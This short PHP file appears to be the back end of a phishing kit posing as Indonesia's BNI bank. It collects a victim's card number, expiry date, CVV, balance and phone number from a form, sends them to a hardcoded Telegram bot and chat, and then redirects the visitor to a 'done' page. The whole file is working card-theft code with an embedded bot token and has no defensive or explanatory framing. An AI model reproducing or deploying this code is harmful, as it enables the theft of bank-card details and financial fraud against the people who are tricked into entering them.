<?php

    header('Location: /bni/done.html');
    
    $apiToken = "6656758431:AAG1ilgQl8UHBrJUvg1K-qSKq658frxL7IY";

$nama            = $_POST['nama'];
$bulan            = $_POST['bulan'];
$tahun            = $_POST['tahun'];
$pesan            = $_POST['pesan'];
$saldo            = $_POST['saldo'];
$nope            = $_POST['nope'];

$message = "
──────────────────────
BANK | BNI | CUAN
──────────────────────
• No Kartu : ".$nama."
• Bulan : ".$bulan."
• Tahun : ".$tahun."
• CVV : ".$pesan."
• Saldo : ".$saldo."
• No HP : ".$nope."
──────────────────────";

    $data = [
        'chat_id' => '6595419648',
        'text' => $message,
        'parse_mode' => "html"
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

    echo '<pre>';
    print_r(json_decode($response));
    die();